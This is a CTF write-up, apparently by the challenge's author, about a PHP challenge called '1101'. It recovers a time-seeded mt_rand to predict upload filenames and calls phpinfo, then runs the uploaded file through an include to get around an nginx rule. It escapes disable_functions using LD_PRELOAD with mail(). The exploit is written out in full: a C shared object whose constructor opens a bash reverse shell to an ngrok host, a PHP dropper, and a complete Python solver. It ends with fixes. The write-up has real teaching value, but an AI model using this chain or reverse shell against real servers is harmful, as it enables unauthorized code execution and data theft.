---
layout: post
title: "SparkCTF - 1101: The Seed Is Literally The Clock"
categories: [web, writeups, CTF]
tags: [php, prng, mt19937, ld_preload, rce, nginx, disable_functions]
date: 2026-09-26
media_subpath: /assets/img/SparkCTF1101
---

# Overview

Full disclosure before anything else: **I am the author of this challenge.** I, d3dn0v4, built **1101** for a local CTF, so this writeup is the author telling on himself. One PHP file that leaks itself with `highlight_file`, an nginx layer we never see, and a `php.ini` whose secrets have to be extracted from the running server. That's it. Nobody hands players a source bundle here, so this is not a "read the code" challenge, it's a "connect the dots" challenge, and the dots are leaked one at a time at runtime.

The name `1101` is binary for `13`, which is exactly the number of hints I ignored before the whole thing clicked. Either that or it's a room number. We'll go with binary, it sounds smarter.

<p align="center"><img src="image.png" alt="Expanding brain: the 1101 security model" width="75%"></p>

Here's the whole kill chain in one breath: the server seeds PHP's Mersenne Twister with `time()`, leaks the first output, names our uploaded file with the seventh output, then includes whatever file we uploaded. Meanwhile nginx blocks `/uploads/*.php` and the platform disables most command execution functions, though it won't tell us which ones until we earn `phpinfo()`. So we recover the PRNG state, use output #7 to pop `phpinfo()` and enumerate exactly which dangerous functions survived, predict the filename, upload a PHP payload that drops a shared object, and let `mail()` do the execution for us. Simple, right? It didn't feel simple at 3 AM.

> **TL;DR (the technical version)**
>
> 1. `mt_srand(time())` seeds PHP's MT19937 with the current second. ±300 seconds of candidates, and the page echoes `mt_rand()` output #1 to confirm the exact seed.
> 2. Send output #7 as `?help=<value>` and you get `phpinfo()`, which shows exactly which functions survived `disable_functions` (`mail()`, `putenv()`, `file_put_contents()`, `include()`).
> 3. Output #7 of the upload request becomes the filename: `uploads/<name>.php`. nginx blocks `/uploads/*.php`, so execute it through the `?pinpaw=` include instead.
> 4. `putenv("LD_PRELOAD=evil.so")` + `mail()` makes `sendmail` load our shared object. Its constructor calls native `system()`, where `disable_functions` has no jurisdiction.
> 5. Reverse shell, `cat /flag_*.txt`, done.
>
> I love PHP. This challenge is a love letter. A passive-aggressive one.

# The Files

Players get exactly one file: the page itself. `highlight_file(__FILE__)` is kind enough to print `index.php` for us, so this is the entire challenge as far as we're concerned:

```
index.php
```

The backend (`php.ini`, `nginx.conf`, `Dockerfile`, `entrypoint.sh`) is never shown to the player. Everything in this writeup was learned at runtime: the disabled function list came from `phpinfo()`, the `/uploads/*.php` block announced itself with a 403 when we tried to hit our upload directly, and the `sendmail` path showed up in `phpinfo()` too. I'll show the backend files here for context, but the exploit only ever acts on what the target actually leaked. My exploit files (`evil.c`, `shell.php`) are the only other pieces.

## index.php

```php
<?php
	mt_srand(time());
	highlight_file(__FILE__);
	echo getmypid() . ':' . strval(mt_rand());
	for ($x = 0; $x < 5; $x++) {
		mt_rand();
	}
	if (isset($_GET['help']) && ($_GET['help'] == strval(mt_rand()))) phpinfo();
	if (isset($_FILES['f'])) {
		if (!is_dir('uploads')) mkdir('uploads');
		$name = strval(mt_rand());
		$uploads = 'uploads/' . $name . '.php';
		move_uploaded_file($_FILES['f']['tmp_name'], $uploads);
		file_put_contents('uploads/.last', $name);
	}
	if (isset($_GET['pinpaw'])) {
		$name = trim(file_get_contents('uploads/.last'));
		$uploads = 'uploads/' . $name . '.php';
		if ($_GET['pinpaw'] == $name) {
			ob_start();
			include($uploads);
			ob_end_clean();
		}
	}
?>
```

That's 25 lines and about four separate terrible decisions. Let's walk through them like a crime scene:

- **Line 2, `mt_srand(time())`** - the seed is the current Unix timestamp in seconds. Not secret. Not even pretending to be secret. The security model of the whole challenge dies on this line.
- **Line 3, `highlight_file(__FILE__)`** - free source disclosure. Thanks, I guess.
- **Line 4, `echo getmypid() . ':' . strval(mt_rand())`** - the PID is cosmetic, but that `mt_rand()` is the **first output of the seeded generator**, printed to us every single request. That's our entry point into the state.
- **Lines 5-7** - five burnt outputs. Warm-up laps.
- **Line 8** - if `?help` equals the **seventh** output, `phpinfo()`. This is our only window into the server's PHP configuration, so it's not a gimmick, it's mandatory recon.
- **Lines 9-15** - on file upload, the filename is `strval(mt_rand())`, the **seventh output** as well (no `help` param), saved to `uploads/<name>.php`, and the name is written to `uploads/.last`.
- **Lines 16-24** - if `?pinpaw` equals the name in `.last`, the server **includes** `uploads/<name>.php` with output buffering, so the payload runs but prints nothing.

## The Wall You Can't See

`index.php` leaks itself but never leaks the PHP config. Somewhere on that box there's a `disable_functions` list and we have no idea what's on it. That matters more than any other unknown in this challenge, because the entire exploit depends on whether the server will let us spawn a process or not.

There is exactly one window into that config, and the leaked source points at it: **line 8 calls `phpinfo()` if we can guess output #7**. That looks like a fun extra until you realize it's the only way to learn the running configuration, which makes it required recon. And to hit it, we first have to clone the PRNG, so Vulnerability 1 has to fall before this door even opens.

Once we land it (Step 2 has the loop), `phpinfo()` hands us the real, running config. The lines that matter:

```
disable_functions = system, exec, passthru, shell_exec, popen, proc_open, pcntl_exec, pcntl_fork, ... dl, posix_kill, scandir, glob, opendir, readdir, ...
disable_classes = DirectoryIterator, GlobIterator, RecursiveDirectoryIterator, FilesystemIterator
allow_url_include = Off
allow_url_fopen = On
```

Read the list again. `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`... all dead. Directory listing dead. URL include dead. At first glance this kills every webshell idea. But look closer, because a few things survived, and they are the whole challenge:

- `mail()` is not disabled
- `putenv()` is not disabled
- `file_put_contents()`, `move_uploaded_file()`, and `include()` are not disabled

No `php.ini` was ever handed to us. `phpinfo()` is the recon step that turns "some functions might be disabled" into a list we can build an exploit on.

## nginx, The Wall Behind The Wall (Backend Context)

Players never get this file either, but the restriction announces itself the moment we try to fetch our uploaded file directly: `GET /uploads/<name>.php` comes back `403`. Here's the backend rule that causes it:

```nginx
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}

location ~ \.php$ {
    include fastcgi_params;
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
```

So even if we know the random filename, we can't browse to `/uploads/1337.php`, nginx returns 403. Cute. But `include()` reads from the filesystem, it never touches nginx. The only way to execute our file is through the `?pinpaw=` include. Which means the filename has to be known. And that leads us straight to the first bug.

## Dockerfile, the Hint Dispenser (Backend Context)

Also never shown to players. `phpinfo()` confirmed the relevant facts at runtime (PHP version, `sendmail_path`, disabled functions), so this file is here purely to explain the environment:

```dockerfile
FROM php:8.1-fpm
RUN apt-get update && apt-get install -y nginx libonig-dev sendmail tzdata ...
ENV TZ=Africa/Tunis
COPY php.ini ...
RUN ... echo "SparkCTF{wh3r3_3vr3yth1ng_st4rt3d}" > /flag_$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n').txt
```

`sendmail` installed for no apparent reason. Flag content fixed but filename randomized. Flag file created with default permissions, so `www-data` can read it once we have a shell. Everything we need.

# Vulnerability 1: `mt_srand(time())` - The PRNG Betrayal (Yes, I Love PHP, That Is The Problem)

> **TL;DR:** the seed is `time()`. That is the vulnerability. An attacker brute forces a ±300 second window in a couple of seconds, and the page leaks output #1 to confirm the exact second. Output #7 becomes the upload filename, and from there it is a straight line to a reverse shell. This is what peak PHP performance looks like, and I say that with love.

Let's talk about the elephant in the room. Mersenne Twister (`MT19937`) is a beautiful PRNG. It has a period of 2^19937−1, it's fast, it's everywhere, and it is **completely deterministic**: same seed, same stream, until the heat death of the universe. It is also famously **not cryptographically secure**. `mt_rand()` hands you 31 bits per call (`0` to `2147483647`), which is exactly enough bits to be useful and exactly too few to be safe.

The seed is `time()`. Not `microtime()`, not a random salt, not anything that changes more than once per second. The seed space for "right now" is `now ± 300`, which is 601 candidates - that is not a keyspace, that is a queue at the bakery. And with output #1 leaked, even that collapses to one: replay every candidate seed, keep the one whose first `mt_rand()` matches the value on the page.

Mechanically, for a seed `S`:

- `mt_srand(S)` initializes the 624-word MT19937 state.
- `mt_rand()` call #1 is the value the page echoes (`getmypid() . ':' . strval(mt_rand())`).
- Calls #2-#6 are burned by the `for` loop.
- Call #7 is the upload filename, `strval(mt_rand())`.

### Why PHP Is My Favorite Language, Actually

- `mt_rand()` is marketed as "random" but comes with a receipt anyone holding a watch can replay.
- `disable_functions` is a bouncer who checks IDs at the front door while leaving the window open.
- `mail()` is a remote code execution primitive wearing a postal uniform.
- And `highlight_file(__FILE__)` hands the attacker the source for free, because why not. It is the most PHP thing in this entire challenge and I adore it.

One detail that makes reproduction painless: since PHP 7.1 the implementation is the standard MT19937, so the sequence for a given seed is identical across PHP 7.1-8.x. No Python reimplementation, no floating-point drama, no "my Python MT produces different numbers" bug hunting. I just asked PHP, the language I love, to betray itself:

```bash
php -r 'mt_srand(1790387045); echo mt_rand();'
1321046223
```

Which is exactly the value the server echoed at the top of the page. Seed found. Game over. In practice the search loop looks like this:

```python
for candidate in range(now - 300, now + 301):
    if php("mt_srand(%d); echo mt_rand();" % candidate) == str(first_rand):
        return candidate
```

<p align="center"><img src="image-2.png" alt="This is fine, the seed is time()" width="75%"></p>

### TL;DR for the people in the back: RNG vs PRNG

- **RNG** (true randomness) feeds on entropy from the real world: hardware noise, timing jitter, `/dev/urandom`. Unpredictable, expensive, slow.
- **PRNG** (pseudo-randomness) is a deterministic algorithm with a hidden state. Same seed, same stream, forever. Perfect for games, simulations, and *absolutely not* for filenames or tokens.
- `mt_srand(time())` is the security equivalent of locking your door and taping the key to the handle, then tweeting the door's address and a photo of the key.

## Recovery, two ways

**Way 1: brute force the clock window.** We know the seed is `time()` at request time, so just walk a window and ask PHP:

```bash
for t in $(seq $(( $(date +%s) - 300 )) $(( $(date +%s) + 300 ))); do
    val=$(php -r "mt_srand($t); echo mt_rand();")
    [ "$val" = "1321046223" ] && echo "seed: $t"
done
```

It looks scary, then finishes in a couple of seconds because spawning PHP 600 times is nothing. This is the "brute force" everyone gasps at, and it's really just reading a clock with extra steps.

**Way 2: `php_mt_seed`.** The challenge folder had a compiled `php_mt_seed` sitting in it, which is the professional route: point it at the leaked output and let it test the whole 32-bit seed space with SIMD.

```bash
./php_mt_seed 1321046223
```

Either way, we end up holding `1790387045`. From there the sequence is fully ours:

```
output #1   -> 1321046223  (leaked by the server)
outputs #2-6 -> burnt by the loop
output #7   -> 185370868   (the upload filename)
```

# Vulnerability 2: Upload + Include = A Webshell That nginx Can't See

Now the filename. This is the part where I made it harder than it needed to be. My first idea: hit the page, grab the leaked output, recover the seed, predict `uploads/<name>.php`, upload, then trigger. Clean. Except there's a nasty race, the **leak comes from one request and the upload happens in another**, and `mt_srand(time())` re-seeds on *every* request. If the leaked request and the upload request land in different seconds, my predicted filename points at nothing and `.last` holds a name I never computed. I sat there padding my script with sleeps and retries like a man trying to outrun a clock.

Then it hit me. The upload response **also echoes `getmypid() . ':' . strval(mt_rand())`** at the top, and it's the first output of the *same PRNG state* that names the file a few lines later. The server hands us the seed of the very request that does the upload. There is no race. We parse the leak from the upload response, recover that request's seed, compute output #7, and trigger the include. Deterministic, boring, beautiful.

For the record, the math on our run: the upload response leaked `1321046223`, seed `1790387045` (that's `2026-09-26 02:44:05`, the exact second the request was seeded), so the filename was `185370868` and the file landed at `uploads/185370868.php`.

# Vulnerability 3: `disable_functions` Is A Suggestion (LD_PRELOAD + `mail()`)

We can now execute a PHP file of our choosing. Normally that's game over: `<?php system($_GET['c']); ?>`. But the `phpinfo()` page already showed us the damage: `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open` are all disabled. Even the classic `pcntl_exec` and `dl` are dead. So what's left?

Two functions that should never be in the same config: `putenv()` and `mail()`.

Here's the magic. `putenv("LD_PRELOAD=/path/to/evil.so")` sets an environment variable for the current PHP-FPM worker process. `LD_PRELOAD` is respected by the dynamic linker: whenever a new executable starts, `ld.so` loads the listed shared library **before** `libc` and runs its constructors before `main()`. Now, `mail()` is implemented in PHP's core in C, and internally it shells out to `/usr/sbin/sendmail`. Since that call happens in C, not through the disabled PHP function wrappers, `popen` being disabled doesn't matter one bit. The `sendmail` child inherits the worker's environment, including our `LD_PRELOAD`, and the linker obediently loads our shared object. Our constructor runs `system()` from native code, and `disable_functions` only exists at the PHP level, it has no idea what a C constructor is.

So the chain is: PHP executes our uploaded file → the file writes `evil.so` → `putenv("LD_PRELOAD=...")` → `mail()` forks `sendmail` → `sendmail` loads our library → reverse shell. The wall we spent the whole challenge respecting turns out to be a wall with a labelled door in it.

<p align="center"><img src="image-4.png" alt="disable_functions vs mail() and putenv" width="70%"></p>

I disabled `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`, the whole `pcntl_*` family and `dl` - defense in depth, obviously. Then I left `putenv()` and `mail()` enabled in the same config, which is the PHP equivalent of locking every door and leaving the keys in a bowl next to the window.

<p align="center"><img src="image-6.png" alt="Surprised Pikachu: I disabled every exec function" width="65%"></p>

## The payloads

`evil.c`, a shared object whose constructor fires the moment it's loaded. It also `unsetenv("LD_PRELOAD")` so the variable doesn't propagate into the shell we spawn and cause weird recursive loading:

```c
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void init(void) {
    unsetenv("LD_PRELOAD");
    system("bash -c 'script -qc /bin/bash /dev/null >& /dev/tcp/5.tcp.eu.ngrok.io/20559 0>&1 &'");
}
```

Wrapping the shell in `script -qc /bin/bash /dev/null` allocates a pty, so the session arrives with echo and job control and behaves like a real terminal. A plain `bash -i` without a tty technically works, but it looks hung over netcat the moment you type, which is a fun way to waste an hour.

Compile it with the page-size flag that makes the ELF load cleanly regardless of the original page alignment:

```bash
gcc -fPIC -shared -o evil.so evil.c -Wl,-z,max-page-size=0x1000
base64 -w 0 evil.so > evil.b64
```

Then `shell.php` is the file we upload. It carries `evil.so` as a base64 string, writes it into `uploads/evil.so` (a plain file, nginx's `.php` rule doesn't apply to `.so`), `chmod`s it, poisons the environment, and calls `mail()` to detonate the loader. Notice we write to `/var/www/html/uploads/evil.so` even though the shell itself lives in `uploads/<rand>.php`:

```php
<?php
$b64 = "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA... [evil.so, base64] ...";
file_put_contents("/var/www/html/uploads/evil.so", base64_decode($b64));
chmod("/var/www/html/uploads/evil.so", 0755);
putenv("LD_PRELOAD=/var/www/html/uploads/evil.so");
mail("x@x.com", "x", "x");
?>
```

One detail that confused me for a moment: after the include, `index.php` calls `ob_end_clean()`, so the `echo` in our shell is swallowed. We see *nothing* in the HTTP response, no "evil.so written", no error. The only signal of success is a connection hitting our listener. Which is a very cool feeling and a very annoying debugging experience.

# Exploitation, Step By Step

## Step 1 - Recon

Hit the page. `highlight_file` dumps the source, followed by the leak at the end:

```
28:1321046223
```

<p align="center"><img src="image-1.png" alt="Source disclosure and PRNG leak" width="100%"></p>

`28` is the PHP-FPM worker PID (changes constantly, harmless), `1321046223` is output #1. From here we know exactly which clock second the generator was seeded with.

## Step 2 - Predict output #7 and pop `phpinfo()` (required)

Before we touch the shell, we want the live list of what PHP will actually let us call. Nobody hands players a `php.ini` here, so the `?help` branch is our only door: it compares the parameter against output #7 and calls `phpinfo()` if it matches. We can clone the generator, so we compute output #7 for the current second and fire:

```python
for t in range(int(time.time()), int(time.time()) + 10):
    val = php("mt_srand(%d); for ($i = 0; $i < 6; $i++) { mt_rand(); } echo mt_rand();" % t)
    r = requests.get(TARGET, params={"help": val})
    if "disable_functions" in r.text:
        print("phpinfo popped at seed", t)
        break
```

Why a loop? Every request re-seeds with *its own* second, so we're predicting output #7 for the second the request actually arrives, and network jitter can push us into the next second. A few tries and one lands. The response is a full `phpinfo()` page, and buried in it is the intel we came for:

- `disable_functions`: `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `pcntl_*`, `dl`, `scandir`, ... every classic gets a mention, all disabled.
- `disable_classes`: the directory iterator family, also dead.
- Still alive: `mail()`, `putenv()`, `file_put_contents()`, `move_uploaded_file()`, `include()`.

That last line *is* the exploit. `putenv()` lets us set `LD_PRELOAD`, and `mail()` spawns a process that will honor it. If phpinfo showed `putenv` disabled or `mail` missing, this would be a completely different writeup, so confirming it here is a must, not a maybe.

<p align="center"><img src="image-10.png" alt="phpinfo reveals which functions survived" width="100%"></p>

## Step 3 - Upload first, predict second

This is the deterministic order I landed on. POST the payload, then **parse the leak out of the upload response**, because that leak belongs to the same request that names the file:

```python
r = requests.post(TARGET, files={"f": ("shell.php", shell, "application/x-php")})
pid, first_rand = re.findall(r"(\d+):(\d+)", r.text)[-1]
```

Then recover the seed around `time()` and reproduce the sequence:

```python
seed = recover_seed(first_rand)
seq = php("mt_srand(%d); $a = mt_rand();"
          "for ($i = 0; $i < 5; $i++) { mt_rand(); }"
          "$b = mt_rand(); echo $a . ':' . $b;" % seed)
```

Which gives us exactly what we already know from our run:

```
[+] upload request pid=28 first=1321046223
[+] seed=1790387045
[+] uploads/185370868.php
```

<p align="center"><img src="image-3.png" alt="Seed recovery and filename prediction" width="100%"></p>

## Step 4 - Detonate via `?pinpaw=`

`uploads/185370868.php` is unreachable through nginx (403), so we knock on the include door:

```bash
curl -s "http://localhost:8080/?pinpaw=185370868"
```

The response body is just the usual page (source + `PID:rand`), nothing from our payload appears, `ob_end_clean()` takes care of that. Behind the scenes the server writes `evil.so`, poisons `LD_PRELOAD`, calls `mail()`, and `sendmail` loads our library. If the listener was up, we're in.

<p align="center"><img src="image-5.png" alt="Upload and include trigger" width="100%"></p>

## Step 5 - Catch the shell and read the flag

```bash
nc -lvnp 4444
```

```
www-data@d0c1e2f3a4b:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@d0c1e2f3a4b:/var/www/html$ cat /flag_*.txt
SparkCTF{wh3r3_3vr3yth1ng_st4rt3d}
```

<p align="center"><img src="image-7.png" alt="Reverse shell and flag" width="100%"></p>

**Flag:** `SparkCTF{wh3r3_3vr3yth1ng_st4rt3d}`

# The Solver

Recon first: pop `phpinfo()` with the output #7 prediction from Step 2 and confirm `mail()` and `putenv()` are alive. That check is mandatory; if either is missing, the whole `LD_PRELOAD` route is dead and you have to look for another primitive. Assuming phpinfo gave us the green light, the final solver does four things, in this order:

1. Uploads `shell.php` and pulls `PID:mt_rand` out of the **upload response** (not a separate GET, that's the race I was talking about).
2. Brute forces the seed in a `now ± 300` window by asking PHP CLI for the first output of each candidate seed.
3. Replays the sequence: first call, five burnt calls, seventh call = filename. Sanity-checks the replay against the leaked output before using it.
4. Requests `?pinpaw=<predicted name>` to trigger the include, while a `nc` listener waits for the reverse shell.

```python
import re
import subprocess
import sys
import time

import requests

TARGET = "http://localhost:8080"
REV_HOST = "5.tcp.eu.ngrok.io"
REV_PORT = 20559


def php(code):
    r = subprocess.run(["php", "-r", code], capture_output=True, text=True)
    if r.returncode != 0:
        print(r.stderr)
        sys.exit(1)
    return r.stdout.strip()


def recover_seed(first):
    now = int(time.time())
    for seed in range(now - 300, now + 301):
        if php("mt_srand(%d); echo mt_rand();" % seed) == str(first):
            return seed
    return None


def leak(response):
    m = re.findall(r"(\d+):(\d+)", response)
    if not m:
        print("[-] no PID:mt_rand() leak found")
        sys.exit(1)
    return m[-1]


with open("shell.php", "rb") as f:
    shell = f.read()

r = requests.post(TARGET, files={"f": ("shell.php", shell, "application/x-php")})
pid, first = leak(r.text)
first = int(first)
print("[+] upload request pid=%s first=%d" % (pid, first))

seed = recover_seed(first)
if seed is None:
    print("[-] seed not recovered, widen the window")
    sys.exit(1)
print("[+] seed=%d" % seed)

seq = php(
    "mt_srand(%d); $a = mt_rand();"
    "for ($i = 0; $i < 5; $i++) { mt_rand(); }"
    "$b = mt_rand(); echo $a . ':' . $b;" % seed
)
check, name = seq.split(":")
if int(check) != first:
    print("[-] sanity check failed, PRNG clone is wrong")
    sys.exit(1)
print("[+] uploaded to uploads/%s.php" % name)

print("[*] triggering %s/?pinpaw=%s" % (TARGET, name))
r = requests.get(TARGET, params={"pinpaw": name})
print("[+] include status %s" % r.status_code)
```

Start an ngrok TCP tunnel (`ngrok tcp 4444`, so the public endpoint maps to your local 4444 listener), put that public endpoint in `REV_HOST`/`REV_PORT` and the same values in `evil.c`, recompile `evil.so`, regenerate `evil.b64`, rebuild `shell.php`, then fire:

```bash
nc -lvnp 4444
python3 solve.py
```

> Local replay: `docker run -d --name 1101 -p 8080:80 1101`, which is what every `http://localhost:8080` URL here assumes. The reverse shell goes out to the ngrok endpoint compiled into `evil.c`, so the container reaches it over the internet; point that at your own ngrok host/port and recompile before testing.

<p align="center"><img src="image-8.png" alt="It ain't much but it's honest work" width="75%"></p>

# Why The Chain Works

| # | Primitive | Where | Why it matters |
|---|-----------|-------|----------------|
| 1 | `mt_srand(time())` | `index.php:2` | PRNG seed is guessable, entire stream is reproducible |
| 2 | Leaked first output | `index.php:4` | Identifies the exact seed in a ±300 window |
| 3 | `?help` + `phpinfo()` | `index.php:8` | Confirms live which dangerous functions are enabled (`mail`, `putenv`) |
| 4 | Upload filename from PRNG | `index.php:11` | We can compute `uploads/<name>.php` before the server does |
| 5 | `?pinpaw` include | `index.php:16-24` | Executes our uploaded PHP even though nginx denies direct access |
| 6 | `putenv()` + `mail()` enabled | `phpinfo()` | `LD_PRELOAD` poisoning of the `sendmail` child |
| 7 | `system()` in a `.so` constructor | `evil.c` | `disable_functions` only applies to PHP-level calls |
| 8 | `sendmail` installed | `Dockerfile` | The process that loads our library |
| 9 | Flag file world-readable | `Dockerfile` | `www-data` can read it without privesc |

# How To Actually Fix This

- **Never seed a PRNG with time for anything security relevant.** Use `random_int()` / `random_bytes()` (CSPRNG) for filenames, tokens, and identifiers. `mt_rand()` is fine for games and simulations, not for security.
- **Don't use user-uploadable files as includes.** Ever. If you must include something, map an opaque server-side session ID to the file and validate the resolved path.
- **Store uploads outside the webroot**, serve them through a controlled handler, and disable execution in the upload directory at the web server *and* application layer.
- **Treat `putenv()`, `mail()`, and `LD_PRELOAD` as a family.** Allowing `putenv()` plus any function that spawns a process (including `mail()`) is a full `disable_functions` bypass. Remove `putenv`, or better, remove `mail()`.
- **`disable_functions` is defense in depth, not a security boundary.** It blocks PHP-level calls only. Native code loaded into a child process doesn't care about your `php.ini`.
- **Don't leave the punchline in the comments.** The shipped `.ini` literally contains `; Allow putenv for LD_PRELOAD`. Players can't see it, but it's a spoiler for anyone handed the image.

# Challenge Rating

**Difficulty:** ★★★☆☆  
**Fun:** ★★★★★  
**Learning Value:** ★★★★★

This one was my favorite kind of web challenge: nothing exotic, just three mild mistakes stacked until they spell RCE. PRNG prediction, a path restriction bypassed by an `include`, and a `disable_functions` escape through a shared library. Each piece is a classic on its own, and I clearly built it as a checklist of "things that look safe but aren't". My favorite touch is that `phpinfo()` is hidden behind the same PRNG prediction it protects: mandatory recon disguised as a bonus, and the only way to learn which functions survived.

---

# Side note

The goal was to show players how a few small PHP tweaks, each one harmless-looking on its own, chain together into full RCE, and to make them get there the old-fashioned way: open the docs, read what `mt_srand()`, `putenv()`, `mail()`, and `disable_functions` actually do, and understand *why* the chain works instead of just pasting a payload that some blog post handed them.

Every piece here is documented behavior, not magic. The PRNG is predictable because the manual says so. `mail()` shells out to `sendmail` because the manual says so. The `include` is right there in the leaked source. I wanted the "aha" moment to come from actually understanding what each function does and why it works at the process level, so that the knowledge sticks long after the flag is submitted.

That was the challenge: not trivia, not a guessing game, just PHP being PHP and players learning to read it properly.

---

### Hashtags

`#SparkCTF #WebSecurity #PHP #PRNG #MT19937 #LDPRELOAD #DisableFunctions #RCE #Nginx #CTF #Writeup`

